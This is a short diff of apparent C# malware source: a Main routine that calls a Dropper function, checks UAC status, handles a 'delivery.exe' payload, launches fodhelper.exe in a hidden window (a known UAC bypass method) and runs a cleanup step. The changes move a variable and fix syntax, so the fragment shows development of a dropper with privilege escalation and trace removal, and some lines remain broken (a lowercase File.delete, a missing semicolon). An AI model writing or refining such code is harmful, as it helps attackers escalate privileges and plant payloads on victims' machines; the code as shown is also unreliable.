@@ -49,8 +49,8 @@ namespace Main {
         public static void Main() {
             Dropper();
             bool status = UAC();
+            string path = Directory.GetCurrentDirectory() + @"\delivery.exe";
             if (!status) {
-                string path = Directory.GetCurrentDirectory() + @"\delivery.exe";
                 File.delete(path);
             }
 
@@ -58,13 +58,13 @@ namespace Main {
             {
                 Arguments = "",
                 FileName = "fodhelper.exe",
-                UseShellExecute = false;
+                UseShellExecute = false,
                 RedirectStandardOutput = false,
                 CreateNoWindow = true
 
             });
 
-            status = Cleanup();
+            status = Cleanup(path)
         }
 
     }
